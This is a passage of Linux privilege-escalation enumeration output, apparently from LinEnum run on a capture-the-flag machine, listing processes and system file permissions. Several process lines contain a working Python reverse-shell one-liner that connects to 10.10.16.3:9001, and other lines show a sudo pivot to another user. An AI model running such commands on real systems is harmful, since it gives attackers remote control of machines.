root        618  0.0  0.6 275864  6304 ?        Ssl  02:07   0:00 /usr/lib/accountsservice/accounts-daemon
root        628  0.0  0.1  20100  1264 ?        Ss   02:07   0:00 /lib/systemd/systemd-logind
message+    638  0.0  0.3  42900  3916 ?        Ss   02:07   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root        646  0.0  1.0 192232 10376 ?        Ssl  02:07   0:13 /usr/bin/vmtoolsd
root        659  0.0  0.3  29008  3072 ?        Ss   02:07   0:00 /usr/sbin/cron -f
root        738  0.0  0.1  15940  1752 tty1     Ss+  02:07   0:00 /sbin/agetty --noclear tty1 linux
root        853  0.0  2.4 255896 24876 ?        Ss   02:07   0:00 /usr/sbin/apache2 -k start
www-data    858  0.0  1.1 256404 11948 ?        S    02:07   0:00 /usr/sbin/apache2 -k start
www-data    859  0.0  1.2 256404 12020 ?        S    02:07   0:00 /usr/sbin/apache2 -k start
www-data    939  0.0  1.2 256404 12020 ?        S    02:10   0:00 /usr/sbin/apache2 -k start
www-data    944  0.0  1.1 256372 11972 ?        S    02:10   0:00 /usr/sbin/apache2 -k start
www-data   1029  0.0  1.1 256372 11972 ?        S    02:33   0:00 /usr/sbin/apache2 -k start
www-data   1030  0.0  1.1 256372 11724 ?        S    02:33   0:00 /usr/sbin/apache2 -k start
www-data   1031  0.0  1.1 256372 11964 ?        S    02:33   0:00 /usr/sbin/apache2 -k start
www-data   1033  0.0  1.1 256308 11820 ?        S    02:33   0:00 /usr/sbin/apache2 -k start
www-data   1034  0.0  1.1 256372 11876 ?        S    02:33   0:00 /usr/sbin/apache2 -k start
www-data   1035  0.0  1.2 256372 12404 ?        S    02:33   0:00 /usr/sbin/apache2 -k start
www-data   1103  0.0  0.0   4508   808 ?        S    02:38   0:00 sh -c cd /home/arrexel; vi bash 2>&1
www-data   1104  0.0  0.3  29132  3408 ?        S    02:38   0:00 vi bash
root       1206  0.0  0.0      0     0 ?        S    02:42   0:05 [kworker/0:1]
www-data   2306  0.0  0.0   4508   840 ?        S    05:41   0:00 sh -c cd /var/www/html/dev; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' 2>&1
www-data   2307  0.0  0.9  42192  9792 ?        S    05:41   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
www-data   2308  0.0  0.1   4508  1704 pts/0    Ss   05:41   0:00 sh
root       2320  0.0  0.3  49792  3448 pts/0    S+   05:42   0:00 sudo -u scriptmanager sudo -l
root       2321  0.0  0.3  50012  3428 pts/0    S+   05:42   0:00 sudo -l
www-data   2322  0.0  0.0   4508   752 ?        S    05:43   0:00 sh -c cd /var/www/html/dev; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' 2>&1
www-data   2323  0.0  0.9  42192  9876 ?        S    05:43   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
www-data   2324  0.0  0.0   4508   696 pts/1    Ss   05:43   0:00 sh
root       2328  0.0  0.3  49792  3584 pts/1    S    05:43   0:00 sudo -u scriptmanager /scripts/bash
scriptm+   2329  0.0  0.0   4508   800 pts/1    S    05:43   0:00 sh /scripts/bash
scriptm+   2330  0.0  0.4  19272  4292 pts/1    S    05:43   0:00 /bin/bash
root       2356  0.0  0.3  49792  3512 pts/1    S+   05:45   0:00 sudo -l
www-data   2449  0.0  0.0   4508   848 ?        S    06:00   0:00 sh -c cd /var/www/html/dev; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' 2>&1
www-data   2450  0.0  1.0  42192  9996 ?        S    06:00   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
www-data   2451  0.0  0.0   4508   796 pts/4    Ss   06:00   0:00 sh
root       2453  0.0  0.3  49792  3564 pts/4    S    06:00   0:00 sudo -u scriptmanager /scripts/bash
scriptm+   2454  0.0  0.0   4508   760 pts/4    S    06:00   0:00 sh /scripts/bash
scriptm+   2455  0.0  0.4  19368  4480 pts/4    S    06:00   0:00 /bin/bash
root      11306  0.0  0.0      0     0 ?        S    06:44   0:00 [kworker/0:0]
scriptm+  11384  0.0  0.3  19368  3300 pts/4    S    06:58   0:00 /bin/bash
scriptm+  11385  0.0  0.4  19272  4472 pts/4    S    06:58   0:00 /bin/bash
scriptm+  11407  0.0  0.3  10568  3592 pts/4    S+   07:01   0:00 bash LinEnum.sh
scriptm+  11408  0.0  0.3  10612  3408 pts/4    S+   07:01   0:00 bash LinEnum.sh
scriptm+  11409  0.0  0.0   4384   660 pts/4    S+   07:01   0:00 tee -a
scriptm+  11593  0.0  0.2  10596  2712 pts/4    S+   07:01   0:00 bash LinEnum.sh
scriptm+  11594  0.0  0.2  34424  2916 pts/4    R+   07:01   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
-rwxr-xr-x 1 root root  326224 Jan 18  2017 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root  618520 Jan 18  2017 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  141904 Jan 18  2017 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root  453240 Jan 18  2017 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root   44104 Dec 16  2016 /sbin/agetty
lrwxrwxrwx 1 root root      20 Dec  4  2017 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root  224208 Jan 12  2017 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root   44528 Feb  9  2017 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root  164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root  662496 Sep 18  2017 /usr/sbin/apache2
-rwxr-xr-x 1 root root   44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root  599328 Apr  5  2016 /usr/sbin/rsyslogd


[-] /etc/init.d/ binary permissions:
total 252
drwxr-xr-x  2 root root 4096 Jun  2 07:19 .
drwxr-xr-x 89 root root 4096 Jun  2 07:25 ..
-rw-r--r--  1 root root 1355 Dec  4  2017 .depend.boot
-rw-r--r--  1 root root  471 Dec  4  2017 .depend.start
-rw-r--r--  1 root root  667 Dec  4  2017 .depend.stop
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root 2210 Apr  5  2016 apache-htcacheclean
-rwxr-xr-x  1 root root 8087 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 6250 Oct  4  2016 apparmor
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root 2813 Dec  1  2015 dbus
-rwxr-xr-x  1 root root 1105 Mar 15  2016 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 15  2015 ondemand
-rwxr-xr-x  1 root root 1578 Sep 17  2016 open-vm-tools
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1192 Sep  5  2015 procps
-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 Dec 16  2016 uuidd
-rwxr-xr-x  1 root root 2757 Nov 10  2015 x11-common


[-] /etc/init/ config file permissions:
total 124
drwxr-xr-x  2 root root 4096 Jun  2 07:19 .
drwxr-xr-x 89 root root 4096 Jun  2 07:25 ..
-rw-r--r--  1 root root 3735 Oct  4  2016 apparmor.conf
-rw-r--r--  1 root root  250 Apr  4  2016 console-font.conf
-rw-r--r--  1 root root  509 Apr  4  2016 console-setup.conf
-rw-r--r--  1 root root  297 Apr  5  2016 cron.conf
-rw-r--r--  1 root root  482 Sep  1  2015 dbus.conf
-rw-r--r--  1 root root 1247 Jun  1  2015 friendly-recovery.conf
-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
-rw-r--r--  1 root root  300 May 21  2014 hostname.sh.conf
-rw-r--r--  1 root root  561 Mar 14  2016 hwclock-save.conf
-rw-r--r--  1 root root  674 Mar 14  2016 hwclock.conf
-rw-r--r--  1 root root  109 Mar 14  2016 hwclock.sh.conf
-rw-r--r--  1 root root  597 Apr 11  2016 irqbalance.conf
-rw-r--r--  1 root root  689 Aug 20  2015 kmod.conf
-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
-rw-r--r--  1 root root  568 Feb  1  2016 passwd.conf
-rw-r--r--  1 root root  363 Jun  5  2014 procps-instance.conf
-rw-r--r--  1 root root  119 Jun  5  2014 procps.conf
-rw-r--r--  1 root root  457 Jun  3  2015 resolvconf.conf
-rw-r--r--  1 root root  426 Dec  2  2015 rsyslog.conf
-rw-r--r--  1 root root  230 Apr  4  2016 setvtrgb.conf
-rw-r--r--  1 root root  337 Apr 12  2016 udev.conf
-rw-r--r--  1 root root  360 Apr 12  2016 udevmonitor.conf
-rw-r--r--  1 root root  352 Apr 12  2016 udevtrigger.conf
-rw-r--r--  1 root root  473 Aug  7  2014 ufw.conf
-rw-r--r--  1 root root  683 Feb 24  2015 ureadahead-other.conf
-rw-r--r--  1 root root  889 Feb 24  2015 ureadahead.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.2M
drwxr-xr-x 26 root root  12K Dec  4  2017 system
drwxr-xr-x  2 root root 4.0K Dec  4  2017 system-sleep
drwxr-xr-x  2 root root 4.0K Dec  4  2017 system-preset
drwxr-xr-x  2 root root 4.0K Dec  4  2017 system-generators
drwxr-xr-x  2 root root 4.0K Dec  4  2017 network
-rwxr-xr-x  1 root root 443K Jan 18  2017 systemd-udevd
-rwxr-xr-x  1 root root  15K Jan 18  2017 systemd-ac-power
-rwxr-xr-x  1 root root  47K Jan 18  2017 systemd-binfmt
-rwxr-xr-x  1 root root 103K Jan 18  2017 systemd-bootchart
-rwxr-xr-x  1 root root  91K Jan 18  2017 systemd-cryptsetup
-rwxr-xr-x  1 root root  75K Jan 18  2017 systemd-fsckd
-rwxr-xr-x  1 root root 276K Jan 18  2017 systemd-initctl
-rwxr-xr-x  1 root root 824K Jan 18  2017 systemd-networkd
-rwxr-xr-x  1 root root  35K Jan 18  2017 systemd-quotacheck
-rwxr-xr-x  1 root root 657K Jan 18  2017 systemd-resolved
-rwxr-xr-x  1 root root  35K Jan 18  2017 systemd-user-sessions
-rwxr-xr-x  1 root root  55K Jan 18  2017 systemd-activate
-rwxr-xr-x  1 root root  91K Jan 18  2017 systemd-backlight
-rwxr-xr-x  1 root root 352K Jan 18  2017 systemd-bus-proxyd
-rwxr-xr-x  1 root root  31K Jan 18  2017 systemd-hibernate-resume
-rwxr-xr-x  1 root root 340K Jan 18  2017 systemd-localed
-rwxr-xr-x  1 root root 605K Jan 18  2017 systemd-logind
-rwxr-xr-x  1 root root 123K Jan 18  2017 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Jan 18  2017 systemd-random-seed
-rwxr-xr-x  1 root root  31K Jan 18  2017 systemd-reply-password
-rwxr-xr-x  1 root root  91K Jan 18  2017 systemd-rfkill
-rwxr-xr-x  1 root root 143K Jan 18  2017 systemd-shutdown
-rwxr-xr-x  1 root root  71K Jan 18  2017 systemd-sleep
-rwxr-xr-x  1 root root  51K Jan 18  2017 systemd-sysctl
-rwxr-xr-x  1 root root 333K Jan 18  2017 systemd-timedated
-rwxr-xr-x  1 root root 139K Jan 18  2017 systemd-timesyncd
-rwxr-xr-x  1 root root 276K Jan 18  2017 systemd-update-utmp
-rwxr-xr-x  1 root root 1.6M Jan 18  2017 systemd
-rwxr-xr-x  1 root root 268K Jan 18  2017 systemd-cgroups-agent
-rwxr-xr-x  1 root root 301K Jan 18  2017 systemd-fsck
-rwxr-xr-x  1 root root 332K Jan 18  2017 systemd-hostnamed
-rwxr-xr-x  1 root root 319K Jan 18  2017 systemd-journald
-rwxr-xr-x  1 root root  51K Jan 18  2017 systemd-modules-load
-rwxr-xr-x  1 root root  51K Jan 18  2017 systemd-remount-fs
-rwxr-xr-x  1 root root  91K Jan 18  2017 systemd-socket-proxyd
-rwxr-xr-x  1 root root 1.3K Jan 12  2017 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Apr 12  2016 system-shutdown

/lib/systemd/system:
total 792K
drwxr-xr-x 2 root root 4.0K Dec  4  2017 apache2.service.d
drwxr-xr-x 2 root root 4.0K Dec  4  2017 halt.target.wants
drwxr-xr-x 2 root root 4.0K Dec  4  2017 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Dec  4  2017 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Dec  4  2017 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Dec  4  2017 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Dec  4  2017 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Dec  4  2017 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Dec  4  2017 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Dec  4  2017 timers.target.wants
lrwxrwxrwx 1 root root   21 Dec  4  2017 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 Dec  4  2017 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Dec  4  2017 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Dec  4  2017 x11-common.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Dec  4  2017 systemd-timesyncd.service.d
lrwxrwxrwx 1 root root    9 Dec  4  2017 sendsigs.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Dec  4  2017 sigpwr.target.wants
lrwxrwxrwx 1 root root    9 Dec  4  2017 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 stop-bootlogd.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Dec  4  2017 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Dec  4  2017 resolvconf.service.wants
lrwxrwxrwx 1 root root    9 Dec  4  2017 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Dec  4  2017 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Dec  4  2017 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Dec  4  2017 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Dec  4  2017 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Dec  4  2017 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Dec  4  2017 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Dec  4  2017 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root   22 Dec  4  2017 procps.service -> systemd-sysctl.service
drwxr-xr-x 2 root root 4.0K Dec  4  2017 rc-local.service.d
lrwxrwxrwx 1 root root   16 Dec  4  2017 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Dec  4  2017 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 reboot.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Dec  4  2017 graphical.target.wants
lrwxrwxrwx 1 root root    9 Dec  4  2017 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Dec  4  2017 kmod.service -> systemd-modules-load.service
drwxr-xr-x 2 root root 4.0K Dec  4  2017 local-fs.target.wants
lrwxrwxrwx 1 root root   28 Dec  4  2017 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Dec  4  2017 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   16 Dec  4  2017 default.target -> graphical.target
lrwxrwxrwx 1 root root    9 Dec  4  2017 fuse.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Dec  4  2017 getty.target.wants
lrwxrwxrwx 1 root root   14 Dec  4  2017 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Dec  4  2017 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 checkroot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec  4  2017 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Dec  4  2017 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Dec  4  2017 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Dec  4  2017 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Dec  4  2017 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Dec  4  2017 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Dec  4  2017 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Dec  4  2017 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
drwxr-xr-x 2 root root 4.0K Feb 15  2017 busnames.target.wants
-rw-r--r-- 1 root root  460 Feb  9  2017 run-vmblock-fuse.mount
-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
-rw-r--r-- 1 root root  770 Jan 18  2017 console-getty.service
-rw-r--r-- 1 root root  742 Jan 18  2017 console-shell.service
-rw-r--r-- 1 root root  791 Jan 18  2017 container-getty@.service
-rw-r--r-- 1 root root 1010 Jan 18  2017 debug-shell.service
-rw-r--r-- 1 root root 1009 Jan 18  2017 emergency.service
-rw-r--r-- 1 root root 1.5K Jan 18  2017 getty@.service
-rw-r--r-- 1 root root  630 Jan 18  2017 initrd-cleanup.service
-rw-r--r-- 1 root root  790 Jan 18  2017 initrd-parse-etc.service
-rw-r--r-- 1 root root  640 Jan 18  2017 initrd-switch-root.service
-rw-r--r-- 1 root root  664 Jan 18  2017 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  677 Jan 18  2017 kmod-static-nodes.service
-rw-r--r-- 1 root root  473 Jan 18  2017 mail-transport-agent.target
-rw-r--r-- 1 root root  568 Jan 18  2017 quotaon.service
-rw-r--r-- 1 root root  612 Jan 18  2017 rc-local.service
-rw-r--r-- 1 root root  978 Jan 18  2017 rescue.service
-rw-r--r-- 1 root root 1.1K Jan 18  2017 serial-getty@.service
-rw-r--r-- 1 root root  653 Jan 18  2017 systemd-ask-password-console.service
-rw-r--r-- 1 root root  681 Jan 18  2017 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 Jan 18  2017 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Jan 18  2017 systemd-binfmt.service
-rw-r--r-- 1 root root  650 Jan 18  2017 systemd-bootchart.service
-rw-r--r-- 1 root root 1.0K Jan 18  2017 systemd-bus-proxyd.service
-rw-r--r-- 1 root root  497 Jan 18  2017 systemd-exit.service
-rw-r--r-- 1 root root  674 Jan 18  2017 systemd-fsck-root.service
-rw-r--r-- 1 root root  648 Jan 18  2017 systemd-fsck@.service
-rw-r--r-- 1 root root  551 Jan 18  2017 systemd-fsckd.service
-rw-r--r-- 1 root root  544 Jan 18  2017 systemd-halt.service
-rw-r--r-- 1 root root  631 Jan 18  2017 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Jan 18  2017 systemd-hibernate.service
-rw-r--r-- 1 root root  710 Jan 18  2017 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Jan 18  2017 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Jan 18  2017 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Jan 18  2017 systemd-initctl.service
-rw-r--r-- 1 root root  731 Jan 18  2017 systemd-journal-flush.service
-rw-r--r-- 1 root root 1.3K Jan 18  2017 systemd-journald.service
-rw-r--r-- 1 root root  557 Jan 18  2017 systemd-kexec.service
-rw-r--r-- 1 root root  691 Jan 18  2017 systemd-localed.service
-rw-r--r-- 1 root root 1.2K Jan 18  2017 systemd-logind.service
-rw-r--r-- 1 root root  693 Jan 18  2017 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Jan 18  2017 systemd-modules-load.service
-rw-r--r-- 1 root root  685 Jan 18  2017 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root 1.3K Jan 18  2017 systemd-networkd.service
-rw-r--r-- 1 root root  553 Jan 18  2017 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Jan 18  2017 systemd-quotacheck.service
-rw-r--r-- 1 root root  717 Jan 18  2017 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Jan 18  2017 systemd-reboot.service
-rw-r--r-- 1 root root  757 Jan 18  2017 systemd-remount-fs.service
-rw-r--r-- 1 root root  907 Jan 18  2017 systemd-resolved.service
-rw-r--r-- 1 root root  696 Jan 18  2017 systemd-rfkill.service
-rw-r--r-- 1 root root  497 Jan 18  2017 systemd-suspend.service
-rw-r--r-- 1 root root  649 Jan 18  2017 systemd-sysctl.service
-rw-r--r-- 1 root root  655 Jan 18  2017 systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Jan 18  2017 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Jan 18  2017 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  703 Jan 18  2017 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Jan 18  2017 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  823 Jan 18  2017 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Jan 18  2017 systemd-udev-trigger.service
-rw-r--r-- 1 root root  825 Jan 18  2017 systemd-udevd.service
-rw-r--r-- 1 root root  757 Jan 18  2017 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Jan 18  2017 systemd-update-utmp.service
-rw-r--r-- 1 root root  573 Jan 18  2017 systemd-user-sessions.service
-rw-r--r-- 1 root root  528 Jan 18  2017 user@.service
-rw-r--r-- 1 root root  403 Jan 18  2017 -.slice
-rw-r--r-- 1 root root  879 Jan 18  2017 basic.target
-rw-r--r-- 1 root root  379 Jan 18  2017 bluetooth.target
-rw-r--r-- 1 root root  358 Jan 18  2017 busnames.target
-rw-r--r-- 1 root root  394 Jan 18  2017 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Jan 18  2017 cryptsetup.target
-rw-r--r-- 1 root root  670 Jan 18  2017 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Jan 18  2017 dev-mqueue.mount
-rw-r--r-- 1 root root  431 Jan 18  2017 emergency.target
-rw-r--r-- 1 root root  501 Jan 18  2017 exit.target
-rw-r--r-- 1 root root  440 Jan 18  2017 final.target
-rw-r--r-- 1 root root  460 Jan 18  2017 getty.target
-rw-r--r-- 1 root root  558 Jan 18  2017 graphical.target
-rw-r--r-- 1 root root  487 Jan 18  2017 halt.target
-rw-r--r-- 1 root root  447 Jan 18  2017 hibernate.target
-rw-r--r-- 1 root root  468 Jan 18  2017 hybrid-sleep.target
-rw-r--r-- 1 root root  553 Jan 18  2017 initrd-fs.target
-rw-r--r-- 1 root root  526 Jan 18  2017 initrd-root-fs.target
-rw-r--r-- 1 root root  691 Jan 18  2017 initrd-switch-root.target
-rw-r--r-- 1 root root  671 Jan 18  2017 initrd.target
-rw-r--r-- 1 root root  501 Jan 18  2017 kexec.target
-rw-r--r-- 1 root root  395 Jan 18  2017 local-fs-pre.target
-rw-r--r-- 1 root root  507 Jan 18  2017 local-fs.target
-rw-r--r-- 1 root root  405 Jan 18  2017 machine.slice
-rw-r--r-- 1 root root  492 Jan 18  2017 multi-user.target
-rw-r--r-- 1 root root  464 Jan 18  2017 network-online.target
-rw-r--r-- 1 root root  461 Jan 18  2017 network-pre.target
-rw-r--r-- 1 root root  480 Jan 18  2017 network.target
-rw-r--r-- 1 root root  514 Jan 18  2017 nss-lookup.target
-rw-r--r-- 1 root root  473 Jan 18  2017 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Jan 18  2017 paths.target
-rw-r--r-- 1 root root  552 Jan 18  2017 poweroff.target
-rw-r--r-- 1 root root  377 Jan 18  2017 printer.target
-rw-r--r-- 1 root root  693 Jan 18  2017 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Jan 18  2017 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  543 Jan 18  2017 reboot.target
-rw-r--r-- 1 root root  396 Jan 18  2017 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Jan 18  2017 remote-fs.target
-rw-r--r-- 1 root root  486 Jan 18  2017 rescue.target
-rw-r--r-- 1 root root  500 Jan 18  2017 rpcbind.target
-rw-r--r-- 1 root root  402 Jan 18  2017 shutdown.target
-rw-r--r-- 1 root root  362 Jan 18  2017 sigpwr.target
-rw-r--r-- 1 root root  420 Jan 18  2017 sleep.target
-rw-r--r-- 1 root root  409 Jan 18  2017 slices.target
-rw-r--r-- 1 root root  380 Jan 18  2017 smartcard.target
